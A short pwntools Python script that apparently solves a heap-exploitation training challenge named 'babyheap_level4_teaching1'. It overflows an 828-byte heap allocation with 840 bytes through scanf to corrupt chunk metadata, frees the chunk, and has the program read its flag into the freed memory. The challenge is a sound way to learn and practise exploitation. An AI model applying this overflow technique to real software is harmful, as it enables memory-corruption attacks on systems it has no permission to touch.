from pwn import *
p = process('/babyheap_level4_teaching1')
# allocate 828 bytes
p.send(b'malloc\n828\n')
# scanf takes in 828 bytes + 16 bytes
# so we can overflow the metadata
p.send(b'scanf\n'+b'a'*840+b'\n')
# free the allocated memory
# read the flag into the freed memory
# so the first 128 bytes is the flag
p.send(b'free\nread_flag\nputs\n')
for i in range(16):
	print(p.recvline())
log.info(p.recvline().decode('utf-8'))
p.close()
